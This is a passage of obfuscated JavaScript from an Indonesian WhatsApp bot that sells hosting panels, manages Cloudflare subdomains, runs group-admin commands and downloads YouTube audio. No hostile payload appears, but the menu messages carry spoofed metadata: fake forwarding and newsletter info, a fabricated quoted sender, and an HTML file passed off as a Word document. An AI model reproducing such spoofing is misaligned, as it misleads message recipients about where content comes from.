          let _0x5d7b62 = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 P A N E L M E N U*\n* addseller\n* delseller\n* listseller\n* addadmin\n* addadmin2\n* cpanel\n* cpanel2\n* cpanel3\n* listpanel\n* listadmin\n* deladmin\n* delpanel";
          const _0x1a9571 = {
            text: _0x5d7b62
          };
          let _0x4cd9bb = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadata: {},
                  deviceListMetadataVersion: 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                  contextInfo: {
                    mentionedJid: [_0x16d835.sender],
                    externalAdReply: {
                      showAdAttribution: true
                    }
                  },
                  body: proto.Message.InteractiveMessage.Body.create(_0x1a9571),
                  nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [{
                      name: "single_select",
                      buttonParamsJson: "{ \"title\": \"Klik Disini\", \"sections\": [{ \"title\": \"# Silahkan Pilih Salah Satu Di Bawah Ini\", \"highlight_label\": \"Powered By " + namaowner + "\", \"rows\": [{ \"header\": \"List Panel\", \"title\": \"List Server Panel\", \"id\": \".listpanel\" }, \n{ \"header\": \"List Admin\", \"title\": \"List Admin Panel\", \"id\": \".listadmin\" }, \n{ \"header\": \"List Reseller\", \"title\": \"List Reseller Panel\", \"id\": \".listseller\" }]}]}"
                    }, {
                      name: "quick_reply",
                      buttonParamsJson: "{\"display_text\":\"Create Panel Otomatis\",\"title\":\"Create Panel V2\",\"id\":\".cpanel2\"}"
                    }]
                  })
                })
              }
            }
          }, {
            userJid: _0x16d835.sender,
            quoted: _0x143656
          });
          await _0x59b98d.relayMessage(_0x4cd9bb.key.remoteJid, _0x4cd9bb.message, {
            messageId: _0x4cd9bb.key.id
          });
        }
        break;
      case "domainmenu":
        {
          let _0x226344 = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 D O M A I N M E N U*\n* listdomain\n* listsubdomain\n* delsubdomain\n";
          const _0x560969 = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x226344,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x560969,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x2573f1 = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x2573f1);
        }
        break;
      case "grupmenu":
        {
          let _0x19f931 = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 G R O U P M E N U*\n* addmember\n* antilink\n* antilinkV2\n* hidetag\n* tagall\n* delete\n* open/close\n* setnamagc\n* setdeskgc\n* setppgc\n* kick\n* promote\n* leavegc\n* leavegc2\n* demote\n";
          const _0x1f600d = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x19f931,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x1f600d,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x166c1a = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x166c1a);
        }
        break;
      case "ownermenu":
        {
          let _0x5f11ec = "\n*Haii* @" + _0x16d835.sender.split("@")[0] + "\nSelamat " + _0x5cf2df() + "\n\n*乂 O W N E R M E N U*\n* clearsession\n* modeoff\n* modeon\n* done\n* anticall\n* autoread\n* welcome\n* setthumbnail\n* setppbotpanjang\n* setppbot\n* setnamabot\n* setbiobot\n* jpmslide\n";
          const _0x1a3d92 = {
            businessOwnerJid: _0x1a329f
          };
          _0x59b98d.sendMessage(_0x16d835.chat, {
            video: {
              url: "https://files.catbox.moe/fek13o.mp4"
            },
            document: fs.readFileSync("./lib/system/vocado.html"),
            gifPlayback: true,
            fileName: _0x5cf2df,
            fileLength: 13,
            pageCount: "520",
            mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            caption: _0x5f11ec,
            contextInfo: {
              externalAdReply: {
                containsAutoReply: true,
                mediaType: 1,
                mediaUrl: "",
                renderLargerThumbnail: true,
                showAdAttribution: false,
                sourceUrl: "https://whatsapp.com/channel/0029Vb3LbOyDZ4LVYsjO0Z0T",
                thumbnailUrl: "https://files.catbox.moe/8djp6x.jpg",
                title: "Asisten Bot Erlangga V3",
                body: "made by Erlangga"
              },
              forwardingScore: 10,
              isForwarded: true,
              mentionedJid: [_0x16d835?.sender],
              businessMessageForwardInfo: _0x1a3d92,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363370508049655@newsletter",
                serverMessageId: null,
                newsletterName: "Channel Developer"
              }
            }
          }, {
            quoted: {
              key: {
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
              },
              message: {
                conversation: "Asisten Bot Erlangga V3"
              }
            }
          });
          const _0x53b4dc = {
            quoted: _0x2c6c12
          };
          await _0x59b98d.sendMessage(_0x16d835.chat, {
            audio: fs.readFileSync("./vn/sound.mp3"),
            mimetype: "audio/mpeg",
            ptt: true
          }, _0x53b4dc);
        }
        break;
      case "panel":
        {
          const _0x5557e5 = "https://files.catbox.moe/8djp6x.jpg";
          async function _0x3c35a1(_0x2c0607) {
            const _0x4853bb = {
              url: _0x2c0607
            };
            const _0x625ad5 = {
              image: _0x4853bb
            };
            const _0x34600a = {
              upload: _0x59b98d.waUploadToServer
            };
            const {
              imageMessage: _0x388a5b
            } = await generateWAMessageContent(_0x625ad5, _0x34600a);
            return _0x388a5b;
          }
          let _0x7f8f54 = generateWAMessageFromContent(_0x16d835.chat, {
            viewOnceMessage: {
              message: {
                interactiveMessage: {
                  body: {},
                  carouselMessage: {
                    cards: [{
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 1GB\n  RAM   = 1125\n  DISK  = 1125\n  CPU   = 40"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 2GB\n  RAM   = 2125\n  DISK  = 2125\n  CPU   = 60"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6288905210582\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 3GB\n  RAM   = 3125\n  DISK  = 3125\n  CPU   = 80"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 4GB\n  RAM   = 4125\n  DISK  = 4125\n  CPU   = 100"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 5GB\n  RAM   = 5125\n  DISK  = 5125\n  CPU   = 120"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 6GB\n  RAM   = 6125\n  DISK  = 6125\n  CPU   = 140"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 7GB\n  RAM   = 7125\n  DISK  = 7125\n  CPU   = 160"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 8GB\n  RAM   = 8125\n  DISK  = 8125\n  CPU   = 180"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = 9GB\n  RAM   = 9125\n  DISK  = 9125\n  CPU   = 200"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }, {
                      header: {
                        imageMessage: await _0x3c35a1(_0x5557e5),
                        hasMediaAttachment: true
                      },
                      body: {
                        text: "  ==== PANEL PTERODACTYL ====\n  PANEL = UNLI\n  RAM   = 0\n  DISK  = 0\n  CPU   = 0"
                      },
                      nativeFlowMessage: {
                        buttons: [{
                          name: "cta_url",
                          buttonParamsJson: "{\"display_text\":\"👤Chet Owner (</ Erlangga - Dev />)\",\"url\":\"https:\\/\\/wa.me\\/6282137392620\",\"webview_presentation\":null}"
                        }]
                      }
                    }],
                    messageVersion: 1
                  }
                }
              }
            }
          }, {});
          await _0x59b98d.relayMessage(_0x7f8f54.key.remoteJid, _0x7f8f54.message, {
            messageId: _0x7f8f54.key.id
          });
        }
        break;
      case "trxoff":
      case "modeoff":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          global.owneroff = true;
          _0x16d835.reply("Berhasil Mengganti Ke Mode *Owner Off*");
        }
        break;
      case "trxon":
      case "modeon":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          global.owneroff = false;
          _0x16d835.reply("Berhasil Mengganti Ke Mode *Owner ON*");
        }
        break;
      case "addseller":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (_0x16d835.quoted || _0x43281f) {
            let _0x3fc54b = _0x16d835.mentionedJid[0] ? _0x16d835.mentionedJid[0] : _0x43281f ? _0x43281f.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x16d835.quoted ? _0x16d835.quoted.sender : "";
            if (_0x5b14b9.includes(_0x3fc54b)) {
              return _0x16d835.reply("User " + _0x3fc54b.split("@")[0] + " Sudah Terdaftar Di Database Reseller Panel!");
            }
            await _0x5b14b9.push(_0x3fc54b);
            await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(_0x5b14b9));
            _0x16d835.reply("Berhasil Menjadikan " + _0x3fc54b.split("@")[0] + " Sebagai Reseller Panel");
          } else {
            return _0x16d835.reply(_0x286488("@tag/62838XXX"));
          }
        }
        break;
      case "delseller":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (_0x16d835.quoted || _0x43281f) {
            let _0x5bf4b8 = _0x16d835.mentionedJid[0] ? _0x16d835.mentionedJid[0] : _0x43281f ? _0x43281f.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : _0x16d835.quoted ? _0x16d835.quoted.sender : "";
            if (!_0x5b14b9.includes(_0x5bf4b8)) {
              return _0x16d835.reply("User " + _0x5bf4b8.split("@")[0] + " Tidak Terdaftar Di Database Reseller Panel!");
            }
            let _0x38b9a1 = _0x5b14b9.indexOf(_0x5bf4b8);
            await _0x5b14b9.splice(_0x38b9a1, 1);
            await fs.writeFileSync("./all/database/reseller.json", JSON.stringify(_0x5b14b9));
            _0x16d835.reply("Berhasil Menghapus " + _0x5bf4b8.split("@")[0] + " Dari Database Reseller Panel");
          } else {
            return _0x16d835.reply(_0x286488("@tag/62838XXX"));
          }
        }
        break;
      case "listseller":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (_0x5b14b9.length < 1) {
            return _0x16d835.reply("Tidak Ada Reseller Panel");
          }
          let _0x2853e8 = " LIST RESELLER PANEL⚡\n\n";
          _0x5b14b9.forEach(_0x4356fd => _0x2853e8 += "* @" + _0x4356fd.split("@")[0] + "\n");
          const _0x194a80 = {
            text: _0x2853e8,
            mentions: [..._0x5b14b9]
          };
          const _0x523b08 = {
            quoted: _0x1f415b
          };
          _0x59b98d.sendMessage(_0x16d835.chat, _0x194a80, _0x523b08);
        }
        break;
      case "yts":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("Dj Tiktok"));
          }
          await _0x16d835.reply(msg.wait);
          await yts(_0x43281f).then(async _0x32eee9 => {
            if (_0x32eee9.all.length == 0) {
              return _0x16d835.reply(mess.error);
            }
            let _0x32082a = "\n*🔎Hasil Pencarian YOUTUBE*\n\n";
            for (let _0x268c5c of _0x32eee9.all) {
              _0x32082a += "*◦ Judul :* " + _0x268c5c.title + "\n*◦ Channel :* " + (_0x268c5c.author?.name || "unknown") + "\n*◦ Durasi :* " + (_0x268c5c?.timestamp || "unknown") + "\n*◦ Link Url :* " + _0x268c5c.url + "\n\n";
            }
            _0x16d835.reply(_0x32082a);
          }).catch(_0x34afd2 => _0x16d835.reply(_0x34afd2.toString()));
        }
        break;
      case "ytmp3":
      case "ytdl":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("linknya"));
          }
          if (!_0x43281f.includes("https")) {
            return _0x16d835.reply("Link Tautan Tidak Valid!");
          }
          if (!_0x43281f.includes("youtu")) {
            return _0x16d835.reply("Link Tautan Tidak Valid!");
          }
          _0x16d835.reply(msg.wait);
          var _0x2038fb = "./all/tmp/" + _0x46df6f(".mp3");
          const _0x5ea21e = _0x43281f;
          const _0x3be594 = {
            quality: "highestaudio",
            filter: "audioonly"
          };
          ytdl(_0x5ea21e, _0x3be594).pipe(fs.createWriteStream(_0x2038fb)).on("finish", async function () {
            var _0x2d1800 = await yts(_0x43281f);
            var _0x22a243 = _0x2d1800.videos[0];
            try {
              let {
                title: _0x2835ea,
                thumbnail: _0x46bbd5,
                timestamp: _0x5c7eaf,
                author: _0x288692,
                url: _0x15346b
              } = _0x22a243;
              const _0xb0f8bd = {
                thumbnailUrl: _0x46bbd5,
                title: _0x2835ea,
                body: "Duration : " + _0x5c7eaf + " | Author : " + _0x288692.name,
                sourceUrl: null,
                renderLargerThumbnail: true,
                mediaType: 1
              };
              await _0x59b98d.sendMessage(_0x16d835.chat, {
                audio: fs.readFileSync(_0x2038fb),
                mimetype: "audio/mpeg",
                contextInfo: {
                  mentionedJid: [_0x16d835.sender],
                  externalAdReply: _0xb0f8bd
                }
              }, {
                quoted: _0x16d835
              });
              await fs.unlinkSync(_0x2038fb);
            } catch (_0x4ad661) {
              await _0x59b98d.sendMessage(_0x16d835.chat, {
                audio: fs.readFileSync(_0x2038fb),
                mimetype: "audio/mpeg"
              }, {
                quoted: _0x16d835
              });
              await fs.unlinkSync(_0x2038fb);
            }
          }).on("error", _0x5be4ca => {
            return _0x16d835.reply(_0x5be4ca.toString());
          });
        }
        break;
      case "setthumb":
      case "setthumbnail":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!/image/g.test(_0x3177c1)) {
            return _0x16d835.reply("Kirim/Balas Foto");
          }
          await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32, "./media/thumbnail.jpg", false);
          _0x16d835.reply("Berhasil Mengganti Foto Thumbnail Menu ✅");
        }
        break;
      case "setppbot":
      case "setpp":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (/image/g.test(_0x3177c1)) {
            let _0xf04d83 = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32);
            const _0x41c673 = {
              url: _0xf04d83
            };
            await _0x59b98d.updateProfilePicture(_0x1a329f, _0x41c673);
            await fs.unlinkSync(_0xf04d83);
            _0x16d835.reply("Berhasil Mengganti Foto Profile Bot ✅");
          } else {
            return _0x16d835.reply(_0x286488("dengan mengirim foto"));
          }
        }
        break;
      case "setppbotpanjang":
      case "setpppanjang":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (/image/g.test(_0x3177c1)) {
            var _0x57c01e = await _0x59b98d.downloadAndSaveMediaMessage(_0x250d32, "ppbot.jpeg", false);
            var {
              img: _0x5ab3f8
            } = await _0x171641(_0x57c01e);
            const _0x2794fa = {
              to: _0x1a329f,
              type: "set",
              xmlns: "w:profile:picture"
            };
            const _0x1806a9 = {
              tag: "picture",
              attrs: {
                type: "image"
              },
              content: _0x5ab3f8
            };
            const _0xc1051e = {
              tag: "iq",
              attrs: _0x2794fa,
              content: [_0x1806a9]
            };
            await _0x59b98d.query(_0xc1051e);
            await fs.unlinkSync(_0x57c01e);
            _0x16d835.reply("Berhasil Mengganti Foto Profil Bot ✅");
          } else {
            return _0x16d835.reply(_0x286488("dengan mengirim foto"));
          }
        }
        break;
      case "setnamabot":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya"));
          }
          _0x59b98d.updateProfileName(_0x43281f);
          _0x16d835.reply("Berhasil Mengganti Nama Bot ✅");
        }
        break;
      case "setbio":
      case "setbiobot":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("teksnya"));
          }
          _0x59b98d.updateProfileStatus(_0x43281f);
          _0x16d835.reply("Berhasil Mengganti Bio Bot ✅");
        }
        break;
      case "listdomain":
        {
          var _0x487964 = "*List Domain Yang Tersedia :*\n\n.domain1 " + global.tld1 + "\n.domain2 " + global.tld2 + "\n.domain3 " + global.tld3 + "\n\n*Contoh Cara Membuat Subdomain :*\nketik *.domain1* hostname|ipvps\n\n*Contoh Cara Melihat Subdomain :*\nketik *.listsubdomain domain1*\n";
          _0x16d835.reply(_0x487964);
        }
        break;
      case "listsubdomain":
      case "listsubdo":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x57e1e7[0]) {
            return _0x16d835.reply(_0x286488("domain1\n\nketik *.listdomain*\nUntuk melihat list domainnya"));
          }
          let _0x1746f3;
          let _0x4f2f18;
          let _0x156658 = _0x57e1e7[0].toLowerCase();
          if (/domain1/.test(_0x156658)) {
            _0x1746f3 = global.zone1;
            _0x4f2f18 = global.apitoken1;
          } else if (/domain2/.test(_0x156658)) {
            _0x1746f3 = global.zone2;
            _0x4f2f18 = global.apitoken2;
          } else if (/domain3/.test(_0x156658)) {
            _0x1746f3 = global.zone3;
            _0x4f2f18 = global.apitoken3;
          }
          const _0x520d0c = {
            Authorization: "Bearer " + ("" + _0x4f2f18),
            "Content-Type": "application/json"
          };
          const _0x23e719 = {
            headers: _0x520d0c
          };
          axios.get("https://api.cloudflare.com/client/v4/zones/" + _0x1746f3 + "/dns_records", _0x23e719).then(async _0x11b7b9 => {
            if (_0x11b7b9.data.result.length < 1) {
              return _0x16d835.reply("Tidak Ada Subdomain");
            }
            var _0x1ca75a = "*🌐 LIST SUBDOMAIN " + _0x156658.toUpperCase() + "*\n\n*Total Subdomain :* " + _0x11b7b9.data.result.length + "\n\n";
            await _0x11b7b9.data.result.forEach(_0x2b2621 => _0x1ca75a += "*Domain :* " + _0x2b2621.name + "\n*IP :* " + _0x2b2621.content + "\n\n");
            return _0x16d835.reply(_0x1ca75a);
          });
        }
        break;
      case "domain1":
      case "domain2":
      case "domain3":
        {
          if (!_0x1d834a) {
            return _0x3abc22(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("host|ip"));
          }
          if (!_0x43281f.split("|")) {
            return _0x16d835.reply(_0x286488("host|ip"));
          }
          let _0x18cb11;
          let _0x491162;
          let _0x50d168;
          let _0x1c7b5d = _0x57e1e7[0].toLowerCase();
          if (/domain1/.test(_0x3e5c8f)) {
            _0x18cb11 = global.zone1;
            _0x491162 = global.apitoken1;
            _0x50d168 = global.tld1;
          } else if (/domain2/.test(_0x3e5c8f)) {
            _0x18cb11 = global.zone2;
            _0x491162 = global.apitoken2;
            _0x50d168 = global.tld2;
          } else if (/domain3/.test(_0x3e5c8f)) {
            _0x18cb11 = global.zone3;
            _0x491162 = global.apitoken3;
            _0x50d168 = global.tld3;
          }
          async function _0x1a4266(_0x362716, _0x5e36ec) {
            return new Promise(_0x5a1bc4 => {
              axios.post("https://api.cloudflare.com/client/v4/zones/" + _0x18cb11 + "/dns_records", {
                type: "A",
                name: _0x362716.replace(/[^a-z0-9.-]/gi, "") + "." + _0x50d168,
                content: _0x5e36ec.replace(/[^0-9.]/gi, ""),
                ttl: 3600,
                priority: 10,
                proxied: false
              }, {
                headers: {
                  Authorization: "Bearer " + _0x491162,
                  "Content-Type": "application/json"
                }
              }).then(_0xaebe2a => {
                let _0x349384 = _0xaebe2a.data;
                if (_0x349384.success) {
                  _0x5a1bc4({
                    success: true,
                    zone: _0x349384.result?.zone_name,
                    name: _0x349384.result?.name,
                    ip: _0x349384.result?.content
                  });
                }
              }).catch(_0x478df7 => {
                let _0x13f3bd = _0x478df7.response?.data?.errors?.[0]?.message || _0x478df7.response?.data?.errors || _0x478df7.response?.data || _0x478df7.response || _0x478df7;
                let _0x30bca6 = String(_0x13f3bd);
                const _0x130ce9 = {
                  success: false,
                  error: _0x30bca6
                };
                _0x5a1bc4(_0x130ce9);
              });
            });
          }
          let _0x107f02 = _0x43281f;
          if (!_0x107f02) {
            return _0x16d835.reply(_0x286488("host|ip"));
          }
          let _0x2003a1 = _0x107f02.split("|")[0].trim().replace(/[^a-z0-9.-]/gi, "");
          if (!_0x2003a1) {
            return _0x16d835.reply("Hostname Tidak Valid!, Hostname Hanya Mendukung Tanda Strip(-) Atau Titik(.)");
          }
          let _0x5768ff = _0x107f02.split("|")[1]?.replace(/[^0-9.]/gi, "");
          if (!_0x5768ff || _0x5768ff.split(".").length < 4) {
            return _0x16d835.reply(_0x5768ff ? "IP Tidak Valid!" : "Isi IP Servernya!");
          }
          await _0x1a4266(_0x2003a1.toLowerCase(), _0x5768ff).then(_0x2a1bbc => {
            if (_0x2a1bbc.success) {
              _0x16d835.reply("*Subdomain Berhasil Dibuat ✅*\n\n*Domain Induk 🌐*\n" + _0x50d168 + "\n*IP 📡*\n" + _0x2a1bbc.ip + "\n*Subdomain 🌐*\n" + _0x2a1bbc.name);
            } else {
              _0x16d835.reply("" + _0x2a1bbc.error);
            }
          });
        }
        break;
      case "delsubdo":
      case "delsubdomain":
        {
          if (!_0x1d834a) {
            return _0x16d835.reply(msg.owner);
          }
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"));
          }
          if (!_0x43281f.split("|")) {
            return _0x16d835.reply(_0x286488("domain1|subdo\n\nUntuk melihat listdomain ketik *.listdomain*"));
          }
          var [_0x3b1d35, _0x11d62b] = _0x43281f.split("|");
          var _0x51a5f2;
          var _0x2fd4b1;
          var _0x4ce84f;
          if (/domain1/.test(_0x3b1d35)) {
            _0x51a5f2 = global.zone1;
            _0x2fd4b1 = global.apitoken1;
            _0x4ce84f = global.tld1;
          } else if (/domain2/.test(_0x3b1d35)) {
            _0x51a5f2 = global.zone2;
            _0x2fd4b1 = global.apitoken2;
            _0x4ce84f = global.tld2;
          } else if (/domain3/.test(_0x3b1d35)) {
            _0x51a5f2 = global.zone3;
            _0x2fd4b1 = global.apitoken3;
            _0x4ce84f = global.tld3;
          } else {
            return _0x16d835.reply("Domain Tidak Ditemukan");
          }
          if (!_0x11d62b.includes(".")) {
            return _0x16d835.reply("Format Subdomain Tidak Valid!");
          }
          var _0x1db011 = _0x11d62b.toLowerCase();
          var _0x2d80cf = null;
          var _0x1cde11 = null;
          await axios.get("https://api.cloudflare.com/client/v4/zones/" + _0x51a5f2 + "/dns_records", {
            headers: {
              Authorization: "Bearer " + _0x2fd4b1,
              "Content-Type": "application/json"
            }
          }).then(async _0xd3a4ff => {
            await _0xd3a4ff.data.result.forEach(_0x2f36bb => {
              if (_0x2f36bb.name == _0x1db011) {
                _0x2d80cf = _0x2f36bb.name;
                _0x1cde11 = _0x2f36bb.id;
              }
            });
          });
          if (_0x2d80cf == null && _0x1cde11 == null) {
            return _0x16d835.reply("Subdomain Tidak Ditemukan");
          }
          await fetch("https://api.cloudflare.com/client/v4/zones/" + _0x51a5f2 + "/dns_records/" + _0x1cde11, {
            method: "DELETE",
            headers: {
              Accept: "application/json",
              "Content-Type": "application/json",
              Authorization: "Bearer " + _0x2fd4b1,
              "Content-Type": "application/json"
            }
          });
          _0x16d835.reply("Berhasil Menghapus Subdomain *" + _0x2d80cf + "* Dari Domain *" + _0x4ce84f + "*");
        }
        break;
      case "tts":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("Hallo saya manusia"));
          }
          if (_0x43281f.length >= 300) {
            return _0x16d835.reply("Jumlah huruf harus di bawah 300!");
          }
          _0x16d835.reply(msg.wait);
          let _0x18e062 = "id_001";
          try {
            const _0x104b30 = {
              text: _0x43281f,
              voice: _0x18e062
            };
            const {
              data: _0x446041
            } = await axios.post("https://tiktok-tts.weilnet.workers.dev/api/generation", _0x104b30);
            _0x59b98d.sendMessage(_0x16d835.chat, {
              audio: Buffer.from(_0x446041.data, "base64"),
              mimetype: "audio/mp4"
            }, {
              quoted: _0x16d835
            });
          } catch (_0x3a19ef) {
            return _0x16d835.reply(_0x3a19ef.toString());
          }
        }
        break;
      case "ytplay":
      case "play":
        {
          if (!_0x43281f) {
            return _0x16d835.reply(_0x286488("Dj tiktok"));
          }
          _0x16d835.reply(msg.wait);
          const {
            pipeline: _0x593023
          } = require("stream");
          const {
            promisify: _0x410b0c
          } = require("util");
